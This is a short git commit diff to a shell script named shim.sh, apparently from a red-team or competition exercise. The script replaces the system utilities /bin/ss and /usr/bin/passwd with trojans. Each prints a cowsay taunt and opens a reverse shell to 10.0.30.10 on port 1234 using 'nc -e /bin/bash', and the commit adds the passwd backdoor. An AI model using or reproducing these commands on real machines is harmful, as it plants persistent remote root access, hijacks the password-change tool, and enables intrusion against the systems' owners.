1e688257c27c4b87fb957c960bff6516a0ff8963
Patrick McCabe <mccabepj@g.cofc.edu>
2022-02-17 19:13:52 -0600

    Update

--- scripts/shim.sh
+++ scripts/shim.sh
@@ -12,3 +12,6 @@ echo "cowsay \"Really having a bad time with these commands now\"" > /bin/ss
 echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /bin/ss
 chmod +x /bin/ss
 
+echo "cowsay \"Uh oh no changing creds now\"" > /usr/bin/passwd
+echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /usr/bin/passwd
+chmod +x /usr/bin/passwd
